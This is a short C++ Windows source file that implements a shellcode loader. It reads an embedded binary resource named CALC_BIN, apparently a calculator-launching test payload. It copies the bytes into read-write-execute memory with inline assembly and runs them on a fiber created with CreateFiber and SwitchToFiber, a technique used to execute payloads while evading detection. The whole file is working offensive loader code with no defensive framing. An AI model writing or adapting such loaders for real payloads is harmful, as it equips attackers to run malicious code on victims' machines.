#include <iostream>
#include <Windows.h>
#include "resource.h"

// Fiber callback function
VOID CALLBACK FiberStart(LPVOID lpParameter)
{
    // Cast the parameter to the shellcode function pointer type
    typedef void(*ShellcodeFn)();
    ShellcodeFn shellcode = (ShellcodeFn)lpParameter;

    // Call the shellcode function
    shellcode();
}

int main()
{
    // Load the resource
    HRSRC codeResource;
    codeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC_BIN1), L"CALC_BIN");
    DWORD codeSize;
    codeSize = SizeofResource(NULL, codeResource);
    HGLOBAL codeResourceData;
    codeResourceData = LoadResource(NULL, codeResource);
    void* codeData;
    codeData = LockResource(codeResourceData);

    // Allocate executable memory
    void* exec;
    exec = VirtualAlloc(NULL, codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the resource data to the executable memory
    __asm {
        mov esi, codeData; Load the address of the code data into the ESI register
        mov edi, exec; Load the address of the executable memory into the EDI register
        mov ecx, codeSize; Load the size of the code into the ECX register
        cld; Clear the direction flag
        rep movsb; Copy the code data to the executable memory
    }

    // Create a new fiber
    LPVOID fiber = ConvertThreadToFiber(NULL);

    // Switch to the new fiber and execute the shellcode
    SwitchToFiber(CreateFiber(0, FiberStart, exec));

    // Free the executable memory
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
